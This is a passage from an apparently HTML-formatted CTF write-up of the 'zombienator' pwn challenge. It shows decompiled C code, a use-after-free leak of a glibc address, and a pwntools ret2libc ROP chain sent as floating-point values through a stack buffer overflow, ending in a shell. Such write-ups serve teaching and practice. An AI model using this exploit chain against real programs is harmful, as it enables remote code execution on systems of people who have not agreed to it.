<span class="mtk1">      </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"[-] There is no Zombienator here!"</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">free</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (z </span><span class="mtk5">+</span><span class="mtk1"> index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n%s</span><span class="mtk4">[+] Zombienator destroyed!</span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0010203f, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00102008);</span>  
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"[-] Invalid position!"</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="show-function">Show function</h3><p>The function <code>display</code> will print all <em>zombienators</em>, no matter if they are freed or not (since they are not actually removed from the array). Therefore, we have a Use After Free vulnerability that we can exploit to get memory leaks:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">display</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  ulong i;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">putchar</span><span class="mtk1">(L</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1">; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (z </span><span class="mtk5">+</span><span class="mtk1"> i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(stdout, </span><span class="mtk4">"Slot [</span><span class="mtk6">%d</span><span class="mtk4">]: Empty</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, i);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(stdout, </span><span class="mtk4">"Slot [</span><span class="mtk6">%d</span><span class="mtk4">]: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, i, </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (z </span><span class="mtk5">+</span><span class="mtk1"> i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>  
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">putchar</span><span class="mtk1">(L</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>For example:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./zombienator</span>

...

<span class="code-blue">##########################</span>
<span class="code-blue">#                        #</span>
<span class="code-blue"># 1. Create  Zombienator #</span>
<span class="code-blue"># 2. Remove  Zombienator #</span>
<span class="code-blue"># 3. Display Zombienator #</span>
<span class="code-blue"># 4. Attack              #</span>
<span class="code-blue"># 5. Exit                #</span>
<span class="code-blue">#                        #</span>
<span class="code-blue">##########################</span>

<span class="code-blue">&gt;&gt; 1</span>

<span class="code-blue">Zombienator's tier: 24</span>

<span class="code-blue">Front line (0-4) or Back line (5-9): 0</span>  

<span class="code-green">[+] Zombienator created!</span>

...

<span class="code-blue">&gt;&gt; 3</span>

<span class="code-blue">Slot [0]: Zombienator ready!</span>
<span class="code-blue">Slot [1]: Empty</span>
...

<span class="code-blue">&gt;&gt; 2</span>

<span class="code-blue">Zombienator's position: 0</span>

<span class="code-green">[+] Zombienator destroyed!</span>

...

<span class="code-blue">&gt;&gt; 3</span>

<span class="code-blue">Slot [0]: 8Y</span>
<span class="code-blue">Slot [1]: Empty</span>
...
</code></pre></div><p>There we have a memory leak: <code>Slot [0]: 8Y</code>.</p><h3 id="attack-function">Attack function</h3><p>Last but not least, we have <code>attack</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">attack</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> number;</span>
<span class="mtk1">  ulong i;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">double</span><span class="mtk1"> attacks [</span><span class="mtk6">33</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Number of attacks: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%hhd</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">number);</span>

<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> (ulong) (</span><span class="mtk7 mtki">long</span><span class="mtk1">) number; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Enter coordinates: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%lf</span><span class="mtk4">"</span><span class="mtk1">, attacks </span><span class="mtk5">+</span><span class="mtk1"> i);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">fclose</span><span class="mtk1">(stderr);</span>
<span class="mtk1">  </span><span class="mtk8">fclose</span><span class="mtk1">(stdout);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>  
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Here we have a Buffer Overflow vulnerability since the array <code>attacks</code> has a reserved size of <code>33</code> elements, but we are asked how many attacks we want. Therefore, if we choose more than <code>33</code>, we will introduce values outside the reserved buffer.</p><p>The difference with a typical Buffer Overflow vulnerability is that we must use floating-point (<code>double</code>) numbers instead of raw bytes, but it&rsquo;s just a format conversion.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>Since the binary has NX and PIE enabled, we can&rsquo;t exploit the Buffer Overflow directly, because the binary addresses are affected by ASLR.</p><p>However, we are able to leak Glibc addresses with the heap part of this challenge. For instance, we can allocate all <em>zombienators</em>, remove all of them and display their information. We will get a lot of memory leaks.</p><p>In fact, since the binary uses Glibc 2.35, there is Tcache. If we free more than 7 chunks of the same size, the next freed chunk will go to the Fast Bin (<code>0x20</code> to <code>0x80</code>) or the Unsorted Bin (<code>0x90</code> and higher sizes). Notice that <code>0x82</code> is not a <code>0x80</code>-sized chunk, so it will go to the Unsorted Bin when the Tcache is full. And Unsorted Bin chunks hold two Glibc pointers <code>fd</code> and <code>bk</code> which point to <code>main_arena</code>.</p><p>So, once we have a Glibc address, we can bypass ASLR and find ROP gadgets to perform a Ret2Libc ROP chain with the Buffer Overflow vulnerability.</p><h2 id="exploit-development">Exploit development</h2><p>First of all, we will use these helper functions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk9 mtki">tier</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">position</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">"Zombienator's tier: "</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">tier</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Front line (0-4) or Back line (5-9): '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">position</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">remove</span><span class="mtk1">(</span><span class="mtk9 mtki">position</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">"Zombienator's position: "</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">position</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">display</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">slots</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> []</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">10</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Slot ['</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">(</span><span class="mtk6">4</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">slots</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">())</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">slots</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">attack</span><span class="mtk1">(</span><span class="mtk9 mtki">coordinates</span><span class="mtk1">: </span><span class="mtk1">List</span><span class="mtk1">[</span><span class="mtk8 mtku">Union</span><span class="mtk1">[</span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">]]):</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'4'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Number of attacks: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk9 mtki">coordinates</span><span class="mtk1">)).</span><span class="mtk8">encode</span><span class="mtk1">())</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">coordinate</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk9 mtki">coordinates</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter coordinates: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">coordinate</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
</code></pre></div><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>The first stage is to leak memory with the previous approach:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">10</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">82</span><span class="mtk1">, </span><span class="mtk1">i</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">10</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">remove</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">, </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">enumerate</span><span class="mtk1">(</span><span class="mtk8">display</span><span class="mtk1">()):</span>  
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">, </span><span class="mtk1">data</span><span class="mtk1">)</span>
</code></pre></div><p>And we have these leaks:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './zombienator'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-dark-green">+</span>] Starting local process './zombienator': pid 2150282
[<span class="code-dark-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './zombienator', '2150282', '-x', '/tmp/pwnunkt19g4.gdb']  
[<span class="code-dark-green">+</span>] Waiting for debugger: Done
0 b't\xa3sV\x05'
1 b'\xd4\xe1DlbU'
2 b'D\xe0DlbU'
3 b'\xb4\xe0DlbU'
4 b'$\xe7DlbU'
5 b'\x94\xe7DlbU'
6 b'\x04\xe6DlbU'
7 b'\xe0\x9c\xc1\xf9\xb8\x7f'
8 b'Zombienator ready!'
9 b'Zombienator ready!'
[<span class="code-blue">*</span>] Switching to interactive mode


##########################
#                        #
# 1. Create  Zombienator #
# 2. Remove  Zombienator #
# 3. Display Zombienator #
# 4. Attack              #
# 5. Exit                #
#                        #
##########################

&gt;&gt; <span class="code-red">$</span>
</code></pre></div><p>Notice that we have a Glibc address at index <code>7</code>. In GDB we can determine the offset to the base address:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>vmmap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-green">Heap</span> | <span class="code-dark-magenta">Stack</span> ]
<span class="code-dark-blue">Start              End                Offset             Perm Path</span>
0x000055673a0be000 0x000055673a0bf000 0x0000000000000000 r-- ./zombienator
<span class="code-dark-red">0x000055673a0bf000</span> <span class="code-dark-red">0x000055673a0c0000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./zombienator</span>
0x000055673a0c0000 0x000055673a0c1000 0x0000000000002000 r-- ./zombienator
0x000055673a0c1000 0x000055673a0c2000 0x0000000000002000 r-- ./zombienator
0x000055673a0c2000 0x000055673a0c3000 0x0000000000003000 rw- ./zombienator
<span class="code-dark-green">0x000055673a374000</span> <span class="code-dark-green">0x000055673a395000</span> <span class="code-dark-green">0x0000000000000000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">[heap]</span>
0x00007fb8f9a00000 0x00007fb8f9a28000 0x0000000000000000 r-- ./glibc/libc.so.6
<span class="code-dark-red">0x00007fb8f9a28000</span> <span class="code-dark-red">0x00007fb8f9bbd000</span> <span class="code-dark-red">0x0000000000028000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./glibc/libc.so.6</span>
0x00007fb8f9bbd000 0x00007fb8f9c15000 0x00000000001bd000 r-- ./glibc/libc.so.6
0x00007fb8f9c15000 0x00007fb8f9c19000 0x0000000000214000 r-- ./glibc/libc.so.6
0x00007fb8f9c19000 0x00007fb8f9c1b000 0x0000000000218000 rw- ./glibc/libc.so.6
0x00007fb8f9c1b000 0x00007fb8f9c28000 0x0000000000000000 rw-
0x00007fb8f9db0000 0x00007fb8f9db5000 0x0000000000000000 rw-
0x00007fb8f9db5000 0x00007fb8f9db7000 0x0000000000000000 r-- ./glibc/ld-linux-x86-64.so.2  
<span class="code-dark-red">0x00007fb8f9db7000</span> <span class="code-dark-red">0x00007fb8f9de1000</span> <span class="code-dark-red">0x0000000000002000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./glibc/ld-linux-x86-64.so.2</span>
0x00007fb8f9de1000 0x00007fb8f9dec000 0x000000000002c000 r-- ./glibc/ld-linux-x86-64.so.2
0x00007fb8f9ded000 0x00007fb8f9def000 0x0000000000037000 r-- ./glibc/ld-linux-x86-64.so.2
0x00007fb8f9def000 0x00007fb8f9df1000 0x0000000000039000 rw- ./glibc/ld-linux-x86-64.so.2
<span class="code-dark-magenta">0x00007ffe9c77a000</span> <span class="code-dark-magenta">0x00007ffe9c79b000</span> <span class="code-dark-magenta">0x0000000000000000</span> <span class="code-dark-magenta">rw-</span> <span class="code-dark-magenta">[stack]</span>
0x00007ffe9c7c3000 0x00007ffe9c7c7000 0x0000000000000000 r-- [vvar]
<span class="code-dark-red">0x00007ffe9c7c7000</span> <span class="code-dark-red">0x00007ffe9c7c9000</span> <span class="code-dark-red">0x0000000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">[vdso]</span>
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
<span class="code-green">gef➤  </span>p/x 0x7fb8f9c19ce0 - 0x00007fb8f9a00000
$1 = 0x219ce0
</code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>This part should be straight forward, it&rsquo;s just a Ret2Libc ROP chain with floating-point numbers:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">display</span><span class="mtk1">()[</span><span class="mtk6">7</span><span class="mtk1">].ljust(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">219ce0</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">rop</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ROP</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">33</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> [</span>
<span class="mtk1">        </span><span class="mtk4">'.'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, p64(</span><span class="mtk1">rop</span><span class="mtk1">.ret.</span><span class="mtk1">address</span><span class="mtk1">))[</span><span class="mtk6">0</span><span class="mtk1">],</span>
<span class="mtk1">        </span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, p64(</span><span class="mtk1">rop</span><span class="mtk1">.rdi.</span><span class="mtk1">address</span><span class="mtk1">))[</span><span class="mtk6">0</span><span class="mtk1">],</span>
<span class="mtk1">        </span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, p64(</span><span class="mtk7">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">))))[</span><span class="mtk6">0</span><span class="mtk1">],</span>
<span class="mtk1">        </span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system))[</span><span class="mtk6">0</span><span class="mtk1">],</span>
<span class="mtk1">    ]</span>

<span class="mtk1">    </span><span class="mtk8">attack</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Basically, we are entering <code>33</code> numbers to fill the reserved buffer. The next value on the stack is the canary, which protects from Buffer Overflow exploits. However, if this value is not modified before executing the <code>return</code> instruction the program just continues. Notice that the program uses <code>scanf</code> to read the floating-point numbers. We can simply enter <code>.</code> to make <code>scanf</code> skip this number. Next, we have the saved <code>$rbp</code> and then the saved <code>$rip</code> (the return address). Here we introduce the Ret2Libc ROP chain and we should get a shell (observe the additional <code>ret</code> gadget to prevent stack alignment issues).</p><p>If we run it, we will get a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './zombienator'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Starting local process './zombienator': pid 2162115  
[<span class="code-green">+</span>] Glibc base address: 0x7f6c56c00000
[<span class="code-blue">*</span>] Loaded 219 cached gadgets for 'glibc/libc.so.6'
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
